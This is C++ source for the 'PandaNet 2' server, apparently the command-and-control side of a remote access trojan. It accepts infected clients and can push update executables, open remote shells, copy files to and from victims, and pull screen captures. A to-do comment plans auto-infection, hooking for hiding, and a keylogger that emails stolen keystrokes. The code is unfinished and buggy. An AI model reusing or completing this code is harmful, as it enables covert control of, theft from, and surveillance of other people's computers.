#include <iostream>

#define WIN32_MEAN_AND_LEAN
#include <WinSock2.h>
#include <Psapi.h>
#include <windows.h>

#include <string>
#include <sstream>
#include <vector>
#include <string.h>
#include <math.h>
#include <conio.h>
//SecondServer.exe
#include <stdio.h>
#include <stdlib.h>
#include "zlib.h"
#include "easyzlib.h"
#include "Network.h"
using namespace std; 
#define MAX_THREADS 10

#define PULSE_TIME 2000
int ezcompress( unsigned char* pDest, long* pnDestLen,const unsigned char* pSrc, long nSrcLen );
int ezuncompress( unsigned char* pDest, long* pnDestLen, const unsigned char* pSrc, long nSrcLen );
struct ClientInfo{
    SOCKET sClient;
    SOCKADDR_IN from;
    HANDLE hThread;
    int threadNum;
    int active;
    int consoleActive;
    char *computerName;
    int versionNumber;
	int VNCFLAG; // 1 for on 0 for off
	int VNCAttach; // 0 for not on 1 for not attached 2 attached
};

struct VNCInfo{
	HINSTANCE hInstance;
	int iCmdShow;
	int ID;


};

void  mooo(void*);
void StartVNCTransfer(int ShellNum);
int WaitingFlag=0;
int ProcessingVncID=0;
int VNCSockConnectedFlag=0;
int pause=0;
SOCKET VNCSocks[100];
/* Announcements!!
cout and printf both work.....
that is all.
*/

 /* 2/1/2010
To do:
1. Some better Clean up (delete's and such)
2. A few dugging things on the list.
3. Make encodings stop fucking talking in plain text (do b4 release ok for debugging purposes)
number 1-26 instead of letters will make it faster.--- use enum
4. AutoInfection
5. Hooking adding hiding
6. Optional KeyLogg which emails to 3d party email system
7. SAFE operations not limited but also including high level encryption algorithms also make safe 
against volatile attacks (malformed packet proof,Irregular send recv cycles,,,,,,,,,,ect)
8. 100% gui base that can minimize down to the small bar 
9. ICMP + mininmap port scanner ( BTW IT IS OPEN SCOURCE)
*/


void serverShell(void *);
void clientHandler(void *);
void asynchShellOutput(void *);

int currentVersion = 1330;

int hostPort = 1526;

int activeThreads = 0, totalThreads = 0;
int acceptorActive = 1;

struct ClientInfo clientList[MAX_THREADS];

int main(){
	
	
    test();

    SetConsoleTitle(L"PandaNet Server");
    SOCKET server;
    SOCKADDR_IN local;
    WSADATA wsaData;
    int wsaret = WSAStartup(MAKEWORD(2,2), &wsaData);
    if(wsaret != 0){
       // printf("Network.c Error: WinSock failed to launch.\n");
		cout<<"Network.c Error: WinSock failed to launch.\n";
        return 0;
    }
    local.sin_family = AF_INET;//address family
    local.sin_addr.s_addr = INADDR_ANY;//wild card IP address
    local.sin_port = htons(hostPort);//port to use
    if((server = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET){
      //  printf("Network.c Error: Socket is invalid.\n");
		cout<<"Network.c Error: Socket is invalid.\n";
        return 0;
    }
    if(bind(server, (SOCKADDR*)&local, sizeof(local)) != 0){
      //  printf("Network.c Error: Socket binding failed.\n");
		cout<<"Network.c Error: Socket binding failed.\n";
        return 0;
    }
    if(listen(server, 10) != 0){
    //    printf("Network.c Error: Listening failed... somehow...\n");
		cout<<"Network.c Error: Listening failed... somehow...\n";
        return 0;
    }

   // printf("Server made!\n");
	cout<< "Server made!\n";
    SOCKET client;
    SOCKADDR_IN from;
    int fromlen = sizeof(from);

   _beginthread(serverShell, 0, &server);
   
  
    while(1){
        while(acceptorActive){
       //     printf("Acceptor: Waiting for Connections...\n");
			char *GiveClientID=new char[100];

			cout<<"Acceptor: Waiting for Connections...\n";
            client = accept(server, (struct sockaddr*)&from, &fromlen);
			cout<<"Acceptor: Valid connection from"<< inet_ntoa(from.sin_addr)<<"\n";
               
			
			if (!1){
				
			}else if (client != INVALID_SOCKET && activeThreads < MAX_THREADS){
				char * Dontcare=new char[100];
				cout<<"Its right here isnt it?"<<endl;
				cout<<"Waiting Flag status:"<<WaitingFlag<<endl;	
				Dontcare=recvData(client); // why does this not work?
				cout<<"IMPORTANT INFO IF IM NOT HERE IM BREAK:"<<Dontcare<<endl;
				if (WaitingFlag==1){

	
					// throw the accept to VNC Client
					cout<<"PLEASE BE HERE!"<<endl;
					
				 if (!strncmp(Dontcare,"VNCSOCKET",strlen("VNCSOCKET"))){
					 VNCSockConnectedFlag=1;
					 int ThreadCare=atoi(&Dontcare[9]); // ID of SOCKET
					 cout<<"VNC SOCKET WITH ID OF"<<ThreadCare<<endl;
					 ProcessingVncID=ThreadCare;
					VNCSocks[ProcessingVncID]=client;		 
					pause=0;
					 // what to do here?.... check who wants an attachment?

				 }else{
					 // oops i got a regular client MY B.
					 if (client != INVALID_SOCKET && activeThreads < MAX_THREADS){
				
              //  printf("Acceptor: Valid connection from %s, Launching clientHandler thread %d.\n", inet_ntoa(from.sin_addr), totalThreads);
				cout<<"Acceptor: Valid connection from"<< inet_ntoa(from.sin_addr)<<", Launching clientHandler thread "<< totalThreads<<"\n";
                activeThreads++;
                totalThreads++;
                int i;
                for(i = 0; i < MAX_THREADS; i++){
                    if (!clientList[i].active){
                        
                        clientList[i].sClient = client;
                        clientList[i].threadNum = totalThreads;
                        clientList[i].from = from;
                        clientList[i].active = 1;
                        clientList[i].consoleActive = 0;
						clientList[i].VNCFLAG=0;
						clientList[i].VNCAttach=0;
                        CloseHandle(clientList[i].hThread);
						itoa(clientList[i].threadNum,GiveClientID,10);
						cout<<GiveClientID<<endl;
						sendData(client,GiveClientID,strlen(GiveClientID)); // THEY WANT THIER ID
                        clientList[i].hThread = (HANDLE)_beginthread(clientHandler, 0, &clientList[i]);
                        break;

							}
						}
					 }
				}
				

			}else{
              //  printf("Acceptor: Valid connection from %s, Launching clientHandler thread %d.\n", inet_ntoa(from.sin_addr), totalThreads);
				cout<<"Acceptor: Valid connection from"<< inet_ntoa(from.sin_addr)<<", Launching clientHandler thread "<< totalThreads<<"\n";
                activeThreads++;
                totalThreads++;
                int i;
				
                for(i = 0; i < 10; i++){
                    if (!clientList[i].active){
						//cout<<"Threads ID:"<<clientList[i].threadNum<<endl;
						
                        clientList[i].sClient = client;
                        clientList[i].threadNum = totalThreads;
                        clientList[i].from = from;
                        clientList[i].active = 1;
                        clientList[i].consoleActive = 0;
						clientList[i].VNCFLAG=0;
						clientList[i].VNCAttach=0;
                        CloseHandle(clientList[i].hThread);
						itoa(clientList[i].threadNum,GiveClientID,10);
						cout<<GiveClientID<<endl;
						sendData(client,GiveClientID,strlen(GiveClientID)); // THEY WANT THIER ID
                        clientList[i].hThread = (HANDLE)_beginthread(clientHandler, 0, &clientList[i]);
                        break;
                    }
                }
				
				}
				delete [] Dontcare;
            }
        }
    }
//    printf("holy crap, son! Connection!\n");
//    printf("Who IS this!?\nComputer: %s:%d...?\n", inet_ntoa(from.sin_addr), from.sin_port);
//    char *in = recvData(client);
//    printf("\nRECIEVED!\n%s\n", in);
//    free(in);
//    sendData(client, "Thinguins!", strlen("Thinguins!"));
//    printf("DONE============================\n");
//    _getch();

    closesocket(server);
    WSACleanup();
    return 0;
}


// this thread is a tarp... just sayin... could be a lot safer
void serverShell(void *arg){
    SOCKET *server = (SOCKET*) arg; 
    char userIn[512];
 cout<<"PandaNet 2 Server Shell\nBy Team Panda\n\nPress any key to bring up prompt.\n";
    while (1){
	/*	
        if (_getch() != 13){//bring up prompt if [ENTER] is pressed
            continue;
       }
	  */ 
       cout<<"\nServer Shell\n> ";
        gets(userIn);

        if (!strncmp(userIn, "exit", 4)){
           cout<<"EXIT: Are you sure? (y/n) ";
            gets(userIn);
            if (!strncmp(userIn, "y", 1)){
               cout<<"EXIT: Seriously, do you really want to do this? (y/n) ";
                gets(userIn);
                if (!strncmp(userIn, "y", 1)){
                    cout<<"EXIT: Last chance to not make an ass of yourself! Exit? (type 1526) ";
                    gets(userIn);
                    if (!strncmp(userIn, "1526", 4)){
                        cout<<"\nExiting Server Shell Loop.\n";
                        break;
                    }
                }
            }

       }else if (!strcmp(userIn, "VNC /?")){
			cout<<" To use type VNC then client number \nEx. VNC 1 would call for vnc on shell 1"<<endl;
		}else if (!strncmp(userIn, "VNC", 3)){
			int ShellNumber;
			ShellNumber=atoi(&userIn[4]);
			
			if (ShellNumber==NULL){
				cout<<"Sorry but something really went wrong. Did you input a number? blame windows please!"<<endl;

			}else if (ShellNumber>0){
				cout<< "Requesting VNC socket from shell "<<ShellNumber<<"...."<<endl;
				StartVNCTransfer(ShellNumber);
			}else{
				cout<< "INVALID NUMBER NUST BE > THAN 0"<<endl;
			}
        }else if (!strncmp(userIn, "help", 4)){
            ///TODO: ADD HALP COMMANDS HERE!
            cout<<"Valid Commands: \nexit, help, list, acceptor, dc, dcall, shell, VNC.\nfor more information try /? \n";
	
       }else if (!strncmp(userIn, "list", 4)){
            cout<<"Listing connected Clients:\n";
            int i;
            for(i = 0; i < MAX_THREADS; i++){
                if(clientList[i].active == 1){
                    //uummmmmmmmm 
					printf("Client #%d:\n"
                           "Name:\t%s\n"
                           "Ver:\t%d\n"
                           "IP:\t%s\n"
                           "Port:\t%d\n", clientList[i].threadNum, clientList[i].computerName, clientList[i].versionNumber, inet_ntoa(clientList[i].from.sin_addr), clientList[i].from.sin_port);
                }
            }
            printf("\nFinished listing Clients.\n");

        }else if (!strncmp(userIn, "acceptor", 8)){
            acceptorActive = !acceptorActive;
            printf("Toggling Acceptor status to: %d\n", acceptorActive);
        }else if (!strncmp(userIn, "shell", 5)){
            int threadNum = atoi(&userIn[6]);
            printf("Launching Shell to Client #%d...\n", threadNum);
            if(threadNum){
                int i, found = 0;
                for(i = 0; i < 10; i++){
                    if(clientList[i].threadNum == threadNum){
                        clientList[i].consoleActive = 1;
                        found = 1;
                        break;
                    }
                }
                if(!found){
                    printf("Could not launch Shell to Client #%d\n", threadNum);
                }else{
                    while(clientList[i].consoleActive){
                        Sleep(500);
                    }
                }
            }else{
                printf("Invalid Client Number.\n");
            }


        }else if(!strncmp(userIn, "dc", 2)){
            int threadNum = atoi(&userIn[3]);
            printf("Disconnecting Client #%d...\n", threadNum);
            int i;
            for(i = 0; i < 10; i++){
                if(clientList[i].threadNum == threadNum){
                    clientList[i].active = 0;
                    Sleep(500);
                    DWORD exitCode;
                    GetExitCodeThread(clientList[i].hThread, &exitCode);
                    TerminateThread(clientList[i].hThread, exitCode);
                    CloseHandle(clientList[i].hThread);
                    break;
                }
            }


        }else{
            printf("Invalid command: %s\n", userIn);

        }


        printf("\nServer Shell Command Processed.\n");
    }
    printf("\nServer Shell Closing...\n");

    acceptorActive = 0;
    closesocket(*server);
    WSACleanup();
    printf("Press any key to Close.\n");
    _getch();

    exit(0);



}

void clientHandler(void *arg){
    struct ClientInfo *info = (ClientInfo*)arg;
   
   // Order of things:
   // Get computer's header: Name, version number
   //     Copy new version to computer if necessary, disconnect.
   // proceed to interpret commands and such.

    
    //1) version number
    //2) computer name
    //3) return update command or go-ahead
    //3a) new copy of program if necessary.
    info->versionNumber = atoi(recvData(info->sClient));
    info->computerName = recvData(info->sClient);

    if (info->versionNumber < currentVersion){
        //Squawk! Update client!
        FILE *updateFile = fopen("update\\update.exe", "rb");
        if(updateFile != NULL){


            sendData(info->sClient, "updateclient", strlen("updateclient"));
            char * response = recvData(info->sClient);
            if(!strncmp("updateready", response, 11)){
                sendFile(info->sClient, updateFile);
                fclose(updateFile);
                printf("Update successful. Disconnecting...\n");
                info->active = 0;
            }else{
                printf("Warning: Thread %d: Client failed to save update file!\n");
            }
            free(response);
        }else{
            printf("Warning: Thread %d: Server failed to load update file!\n");
        }



    }


    int heartbeatCycle = 0;

    while(info->active){
        Sleep(100);
		/*
        if(heartbeatCycle++ >= PULSE_TIME / 100){
            sendData(info->sClient, "ping", strlen("ping"));
            char *in = recvData(info->sClient);
            if(in == NULL){
                printf("Warning: Thread %d: Connection Interrupted.\n", info->threadNum);
                info->active = 0;
                break;
            }else{
                free(in);
                heartbeatCycle = 0;
            }


        }
		*/
        if(info->consoleActive){
            printf("Shell Active. Type 'exit' at any time to return to server shell.\n");
            sendData(info->sClient, "makeshell", strlen("makeshell"));
            HANDLE asynchReader = (HANDLE)_beginthread(asynchShellOutput, 0, info); // this is dumb.

            while(info->consoleActive){

                char userIn[512];
                gets(userIn);

                if(!strncmp(userIn, "info", 4)){//Catching server-side commands
                    printf("Connection Information:\n\tThread Number: %d\n\tComputer Name: %s\n\tIP: %s\n\tPort: %d\n",
                           info->threadNum, info->computerName, inet_ntoa(info->from.sin_addr), info->from.sin_port);

                }else if(!strncmp(userIn, "localdir", 8)){
                    system("dir");
                    sendData(info->sClient, "\n", strlen("\n"));

                }else if(!strncmp(userIn, "copyto", 6)){
                    ///1) get two params: local file and client file
                    ///2) if valid, alert client, get client's availability.
                    ///3) if valid, sendFile!
                    DWORD exitCode;
                    GetExitCodeThread(asynchReader, &exitCode);
                    TerminateThread(asynchReader, exitCode);

                    printf("Enter local file name: ");
                    char filename[512];
                    gets(filename);
                    FILE *localFile = fopen(filename, "rb");
                    if(localFile != NULL){
                        sendData(info->sClient, userIn, sizeof(userIn));
                        char *validity = recvData(info->sClient);
                        if(!strncmp(validity, "VALID", 5)){
                            printf("Remote file is valid!\n");
                            sendFile(info->sClient, localFile);
                            fclose(localFile);

                        }else{
                            printf("Remote file is not valid!\n");
                        }

                        if(validity != NULL){
                            free(validity);
                        }
                    }else{
                        printf("Local file does not exist!\n");
                    }
                    asynchReader = (HANDLE)_beginthread(asynchShellOutput, 0, info);

                }else if(!strncmp(userIn, "copyfrom", 8)){
                    //copy file from client
                    ///1) get two params: local file and client file.
                    ///2) if local file is valid, alert client.
                    ///3) if client acknowledges as valid file, recvFile and save!
                    DWORD exitCode;
                    GetExitCodeThread(asynchReader, &exitCode);
                    TerminateThread(asynchReader, exitCode);

                    printf("Enter local file name: ");
                    char filename[512];
                    gets(filename);
                    FILE *localFile = fopen(filename, "wb");
                    if(localFile != NULL){
                        sendData(info->sClient, userIn, sizeof(userIn));
                        char *validity = recvData(info->sClient);
                        if(!strncmp(validity, "VALID", 5)){
                            printf("Remote file is valid!\n");
                            recvFile(info->sClient, localFile);
                            fclose(localFile);

                        }else{
                            printf("Remote file is not valid!\n");
                        }
                        if(validity != NULL){
                            free(validity);
                        }
                    }else{
                        printf("Local file cannot be made!\n");
                    }
                    asynchReader = (HANDLE)_beginthread(asynchShellOutput, 0, info);

                }else{
                    sendData(info->sClient, userIn, strlen(userIn));
                    if(!strncmp(userIn, "exit", 4)){//catching tandem commands
                        printf("Exiting Client #%d Shell...\n", info->threadNum);
                        info->consoleActive = 0;

                        DWORD exitCode;
                        GetExitCodeThread(asynchReader, &exitCode);
                        TerminateThread(asynchReader, exitCode);

                        break;
                    }


                }

            }
        }

    }



}


// 1. we dont need this.
//	2. if we wanted this it could be so very much smarter.

void asynchShellOutput(void *arg){
    struct ClientInfo *info = (ClientInfo*) arg;
    while(info->consoleActive){
        char *in = recvData(info->sClient);
        if(in != NULL){
            printf("%s", in);
            free(in);
        }else{
            printf("Warning: Connection Interrupted.\n");
            info->consoleActive = 0;
            info->active = 0;
            break;
        }

    }

}




void StartVNCTransfer(int ShellNum){
	// STEP 1 DOES THE SHELL EXSIST
	//-----------//STEP 2 AM I AN MY OWN THREAD?
	// STEP 3 Make a socket for image transfers.
	//STEP 4 DISSCONNECT ON LOSS OF SHELL

	// so making another socket with client
	SOCKET VNCserver;
	int notFound=0;
	for (int i=0;i<totalThreads;i++){
		if (ShellNum== clientList[i].threadNum){
			// done step 1.
			cout<<"Client Found!\n";
			SOCKET ClientSock=clientList[i].sClient;
			// Start some flags here
			WaitingFlag=1;
			sendData(ClientSock,"VncStart",strlen("VncStart"));
			
			char * RequestResponse=recvData(ClientSock);
			cout<<RequestResponse<<endl;
			if(!strcmp(RequestResponse,"Attempting")){
			// crap load of flags here
				
			clientList[i].VNCFLAG=1;
			clientList[i].VNCAttach=1;
			
			pause=1;
			while (pause==1){
				
				// 1 in 1 out 
				
			}
			cout<< "VNC ID:"<<ProcessingVncID<<endl;
			cout<<"IT SHOULD BE :"<<clientList[i].threadNum<<endl;


			if (ProcessingVncID==clientList[i].threadNum){
				cout<<"We got our selves a keeper."<<endl;
				//flag to show that VNCSocket is attached.
				clientList[i].VNCAttach=2;
				struct VNCInfo *PassedInfo=new VNCInfo[sizeof(VNCInfo)];
				//HINSTANCE hInstance =;
				PassedInfo->hInstance= (HINSTANCE)GetModuleHandle(NULL);
				PassedInfo->iCmdShow=1;
				PassedInfo->ID=ShellNum;
				notFound=0;
				_beginthread(mooo,0,(void *)&PassedInfo);// not quite ready friend 
				// NOW WE HAVE TO SET ALL THOSE FLAGS TO OFF AGAIN!!!! 
			}else{
				cout<<"Wrong VNC ID. What now?"<<endl;


			}
			 // show window 1= normal.
			//create process mooo(hInstance,1);

			}
			else if(!strcmp(RequestResponse,"Failed")){
			WaitingFlag=0;

			}else{
			WaitingFlag=0;
			notFound=1;
			}
			

		}
		
		

	}
	


	if (!notFound){
		cout<<"No Client with that ID found"<<endl;
	}
		

}

#include <windows.h>
#include <objidl.h>
#include <string>
#include <iostream>
#include <gdiplus.h>
#include <string.h>
using namespace Gdiplus;
#pragma comment (lib,"Gdiplus.lib")
INT GetEncoderClsid(const WCHAR* format, CLSID* pClsid);  // helper function
Image* ImageCaptureAndCompress(int ID);
RECT rect;
HWND                hWnd;
int width=10;
int height=10;
Image* FreshImage=NULL;

int ProcessingImage=0;
     BITMAP bm;
    HDC dc;
    HDC Cdc;
    int cx;
    int cy;
	Image* Mydisplay=NULL;
VOID OnPaint(HDC hdc)
{
    
    GetWindowRect(hWnd, &rect);

  int width = rect.right - rect.left;
  int height = rect.bottom - rect.top;

 
 Graphics *graphics=new Graphics(hdc);

	// num=1;
	Mydisplay= ImageCaptureAndCompress(1); // this can be fixed easy enough
	

 
 graphics->DrawImage(Mydisplay,0,0,width,height);
  
  cout<<"Rendered."<<endl;

}

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
//INT WINAPI mooo(void *arg)

void  mooo(void *arg)
{
	
	struct VNCInfo *ThisVNC=(VNCInfo*)arg;
	HINSTANCE hInstance=(HINSTANCE)GetModuleHandle(NULL);
	INT iCmdShow=1;
	int ThisID=ThisVNC->ID;
   
   MSG                 msg;
   WNDCLASS            wndClass;                                                
   GdiplusStartupInput gdiplusStartupInput;
   ULONG_PTR           gdiplusToken;
   


   // Initialize GDI+.
   GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
   
   wndClass.style          = CS_HREDRAW | CS_VREDRAW;
   wndClass.lpfnWndProc    = WndProc;
   wndClass.cbClsExtra     = 0;
   wndClass.cbWndExtra     = 0;
   wndClass.hInstance      = hInstance;
   wndClass.hIcon          = LoadIcon(NULL, IDI_APPLICATION);
   wndClass.hCursor        = LoadCursor(NULL, IDC_ARROW);
   wndClass.hbrBackground  = (HBRUSH)GetStockObject(WHITE_BRUSH);
   wndClass.lpszMenuName   = NULL;
   wndClass.lpszClassName  = TEXT("GettingStarted");
   
   RegisterClass(&wndClass);
   
 
     dc=GetDC(NULL);
     Cdc=CreateCompatibleDC(dc);
     cx=GetSystemMetrics(SM_CXSCREEN);
     cy=GetSystemMetrics(SM_CYSCREEN);
  cout<<"Im up in the gui all over here!"<<endl;
  hWnd = CreateWindow(
      TEXT("GettingStarted"),   // window class name
      TEXT("Getting Started"),  // window caption
      WS_OVERLAPPEDWINDOW,      // window style
      CW_USEDEFAULT,            // initial x position
      CW_USEDEFAULT,            // initial y position
      CW_USEDEFAULT,            // initial x size
      CW_USEDEFAULT,            // initial y size
      NULL,                     // parent window handle
      NULL,                     // window menu handle
      hInstance,                // program instance handle
      NULL);                    // creation parameters
      
   ShowWindow(hWnd, iCmdShow);
   UpdateWindow(hWnd);
   
   while(GetMessage(&msg, NULL, 0, 0))
   {
      TranslateMessage(&msg);
      DispatchMessage(&msg);
   }
   
   GdiplusShutdown(gdiplusToken);
   //return msg.wParam;
}  // WinMain

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, 
   WPARAM wParam, LPARAM lParam)
{
   HDC          hdc;
   PAINTSTRUCT  ps;
   
   switch(message)
   {
   case WM_PAINT:
      hdc = BeginPaint(hWnd, &ps);
      OnPaint(hdc);
      EndPaint(hWnd, &ps);
      return 0;
   case WM_DESTROY:
      PostQuitMessage(0);
      return 0;
   default:
      return DefWindowProc(hWnd, message, wParam, lParam);
   }
}


Image* ImageCaptureAndCompress(int ID){


	 // Initialize GDI+.
   GdiplusStartupInput gdiplusStartupInput;
   ULONG_PTR gdiplusToken;
   GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

   CLSID             encoderClsid;
   EncoderParameters encoderParameters;
   ULONG             quality;
   Status            stat;

   // Get an image from the disk.
  // Image* image = new Image(L"Shapes.bmp");
    BITMAP bm;
    HDC dc=GetDC(NULL);
    HDC Cdc=CreateCompatibleDC(dc);
	int cx=GetSystemMetrics(SM_CXSCREEN);
    int cy=GetSystemMetrics(SM_CYSCREEN);
    
  
    HBITMAP hMymap=CreateCompatibleBitmap(dc,cx,cy);
    SelectObject(Cdc,hMymap);
    BitBlt(Cdc, 0,0, cx, cy, dc,0,0,SRCCOPY);
    GetObject(hMymap,sizeof(bm),&bm);
	Graphics *mgraphics=new Graphics(dc);
	Image* image= new Bitmap(hMymap,NULL);
	
// Get the CLSID of the JPEG encoder.
   GetEncoderClsid(L"image/jpeg", &encoderClsid);

   encoderParameters.Count = 1;
   encoderParameters.Parameter[0].Guid = EncoderQuality;
   encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
   encoderParameters.Parameter[0].NumberOfValues = 1;

   // Save the image as a JPEG with quality level 0.
   quality = 25;
   encoderParameters.Parameter[0].Value = &quality;

   char *pBuff;
	   ULARGE_INTEGER ulnSize;

LARGE_INTEGER lnOffset;
lnOffset.QuadPart = 0;
sendData(VNCSocks[ID],"GetImage",strlen("GetImage"));
  ProcessingImage=1;
  char * input=new char[1000];
   input=recvData(VNCSocks[ID]); //times out 
   cout<<"MesageBack:"<<input<<endl;
   if (!strncmp(input,"SendingData",strlen("SendingData"))){
	   cout<<"Woot getting my image bitch"<<endl;
	
   char * AciiNum=new char[1000];
   AciiNum=recvData(VNCSocks[ID]);
   cout<<"Number of bytes to allocate:"<<AciiNum<<endl;

   ulnSize.QuadPart=atol(AciiNum);
     cout<<"OR :"<<ulnSize.QuadPart<<endl;
   //char * Imagebuffer=new char[ulnSize.QuadPart];
   pBuff = new char[ulnSize.QuadPart];
  // pBuff=recvData(VNCSocks[ID]);
   recv(VNCSocks[ID],pBuff,ulnSize.QuadPart,0);
   }else{

	   cout<< "HATE!"<<endl;


   }
// void *ConvertImage=NULL;


        
 ULONG ulBytesRead=0;
// int	Mycount=ulBytesRead;

   IStream* FreshStream=NULL;
HRESULT hr=CreateStreamOnHGlobal(NULL, TRUE, &FreshStream);
// write peices to stream
cout<<"Size of PBuff="<<strlen(pBuff)<<endl;
FreshStream->Write(pBuff,ulnSize.QuadPart,&ulBytesRead);
cout<<"Wrote:"<<ulBytesRead<<endl;
//decompress stream
Image* FreshImage=new Image(FreshStream);

 //  GdiplusShutdown(gdiplusToken);
 return FreshImage;
}


int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
   UINT  num = 0;          // number of image encoders
   UINT  size = 0;         // size of the image encoder array in bytes

   ImageCodecInfo* pImageCodecInfo = NULL;

   GetImageEncodersSize(&num, &size);
   if(size == 0)
      return -1;  // Failure

   pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
   if(pImageCodecInfo == NULL)
      return -1;  // Failure

   GetImageEncoders(num, size, pImageCodecInfo);

   for(UINT j = 0; j < num; ++j)
   {
      if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 )
      {
         *pClsid = pImageCodecInfo[j].Clsid;
         free(pImageCodecInfo);
         return j;  // Success
      }    
   }

   free(pImageCodecInfo);
   return -1;  // Failure
}



/*
     // Initialize GDI+.
   GdiplusStartupInput gdiplusStartupInput;
   ULONG_PTR gdiplusToken;
   GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

   CLSID             encoderClsid;
   EncoderParameters encoderParameters;
   ULONG             quality;
   Status            stat;

   // Get an image from the disk.
  // Image* image = new Image(L"Shapes.bmp");
    
    
  
   cout<<"running"<<endl;
    GetEncoderClsid(L"image/jpeg", &encoderClsid);
   encoderParameters.Count = 1;
   encoderParameters.Parameter[0].Guid = EncoderQuality;
   encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
   encoderParameters.Parameter[0].NumberOfValues = 1;
   
   quality = 25;
  
   encoderParameters.Parameter[0].Value = &quality;
   sendData(VNCSocks[ID],"GetImage",strlen("GetImage"));
  ProcessingImage=1;
   char * input=new char[1000];
   input=recvData(VNCSocks[ID]); //times out 
   cout<<"MesageBack:"<<input<<endl;
   if (!strncmp(input,"SendingData",strlen("SendingData"))){
	   cout<<"Woot getting my image bitch"<<endl;
	
   char * AciiNum=new char[1000];
   AciiNum=recvData(VNCSocks[ID]);
   cout<<"Number of bytes to allocate:"<<AciiNum<<endl;
   ULARGE_INTEGER ulnSize;
   ulnSize.QuadPart=atol(AciiNum);
   char * Imagebuffer=new char[ulnSize.QuadPart];
   Imagebuffer=recvData(VNCSocks[ID]);

     IStream* FreshStream=NULL;
CreateStreamOnHGlobal(NULL, TRUE, &FreshStream);
// write peices to stream
     ULONG ulBytesRead;
FreshStream->Write(Imagebuffer,ulnSize.QuadPart,&ulBytesRead);
cout<<"Read Byte:"<<ulBytesRead<<endl;
FreshImage=new Image(FreshStream);





   }else{
	   cout << "Crap!"<<endl;
   IStream* FreshStream=NULL;
   }
   ProcessingImage=0;
        
 //  GdiplusShutdown(gdiplusToken);
return FreshImage; 
}
*/







/* BASE CODE FOR SCREEN SAVE AND GUI 
#include <windows.h>
#include <objidl.h>
#include <string>
#include <iostream>
#include <gdiplus.h>
#include <string.h>
using namespace Gdiplus;
#pragma comment (lib,"Gdiplus.lib")
INT GetEncoderClsid(const WCHAR* format, CLSID* pClsid);  // helper function
Image* ImageCaptureAndCompress();
RECT rect;
HWND                hWnd;
int width=10;
int height=10;



     BITMAP bm;
    HDC dc;
    HDC Cdc;
    int cx;
    int cy;
VOID OnPaint(HDC hdc)
{
    
    GetWindowRect(hWnd, &rect);

  int width = rect.right - rect.left;
  int height = rect.bottom - rect.top;


 Graphics *graphics=new Graphics(hdc);
 Image* Mydisplay= ImageCaptureAndCompress();
 graphics->DrawImage(Mydisplay,0,0,width,height);
  


}

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, PSTR, INT iCmdShow){



}

INT WINAPI mooo(HINSTANCE hInstance, HINSTANCE, PSTR, INT iCmdShow)
{
   
   MSG                 msg;
   WNDCLASS            wndClass;                                                
   GdiplusStartupInput gdiplusStartupInput;
   ULONG_PTR           gdiplusToken;
   


   // Initialize GDI+.
   GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
   
   wndClass.style          = CS_HREDRAW | CS_VREDRAW;
   wndClass.lpfnWndProc    = WndProc;
   wndClass.cbClsExtra     = 0;
   wndClass.cbWndExtra     = 0;
   wndClass.hInstance      = hInstance;
   wndClass.hIcon          = LoadIcon(NULL, IDI_APPLICATION);
   wndClass.hCursor        = LoadCursor(NULL, IDC_ARROW);
   wndClass.hbrBackground  = (HBRUSH)GetStockObject(WHITE_BRUSH);
   wndClass.lpszMenuName   = NULL;
   wndClass.lpszClassName  = TEXT("GettingStarted");
   
   RegisterClass(&wndClass);
   
 
     dc=GetDC(NULL);
     Cdc=CreateCompatibleDC(dc);
     cx=GetSystemMetrics(SM_CXSCREEN);
     cy=GetSystemMetrics(SM_CYSCREEN);
   hWnd = CreateWindow(
      TEXT("GettingStarted"),   // window class name
      TEXT("Getting Started"),  // window caption
      WS_OVERLAPPEDWINDOW,      // window style
      CW_USEDEFAULT,            // initial x position
      CW_USEDEFAULT,            // initial y position
      CW_USEDEFAULT,            // initial x size
      CW_USEDEFAULT,            // initial y size
      NULL,                     // parent window handle
      NULL,                     // window menu handle
      hInstance,                // program instance handle
      NULL);                    // creation parameters
      
   ShowWindow(hWnd, iCmdShow);
   UpdateWindow(hWnd);
   
   while(GetMessage(&msg, NULL, 0, 0))
   {
      TranslateMessage(&msg);
      DispatchMessage(&msg);
   }
   
   GdiplusShutdown(gdiplusToken);
   return msg.wParam;
}  // WinMain

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, 
   WPARAM wParam, LPARAM lParam)
{
   HDC          hdc;
   PAINTSTRUCT  ps;
   
   switch(message)
   {
   case WM_PAINT:
      hdc = BeginPaint(hWnd, &ps);
      OnPaint(hdc);
      EndPaint(hWnd, &ps);
      return 0;
   case WM_DESTROY:
      PostQuitMessage(0);
      return 0;
   default:
      return DefWindowProc(hWnd, message, wParam, lParam);
   }
}


Image* ImageCaptureAndCompress(){


     // Initialize GDI+.
   GdiplusStartupInput gdiplusStartupInput;
   ULONG_PTR gdiplusToken;
   GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

   CLSID             encoderClsid;
   EncoderParameters encoderParameters;
   ULONG             quality;
   Status            stat;

   // Get an image from the disk.
  // Image* image = new Image(L"Shapes.bmp");
    
    
  
    HBITMAP hMymap=CreateCompatibleBitmap(dc,cx,cy);
    SelectObject(Cdc,hMymap);
    BitBlt(Cdc, 0,0, cx, cy, dc,0,0,SRCCOPY);
    GetObject(hMymap,sizeof(bm),&bm);
    Graphics *mgraphics=new Graphics(dc);
    Image* image= new Bitmap(hMymap,NULL);
    GetEncoderClsid(L"image/jpeg", &encoderClsid);
   encoderParameters.Count = 1;
   encoderParameters.Parameter[0].Guid = EncoderQuality;
   encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
   encoderParameters.Parameter[0].NumberOfValues = 1;

   quality = 25;
   encoderParameters.Parameter[0].Value = &quality;
   


  IStream* MyPstream=NULL;

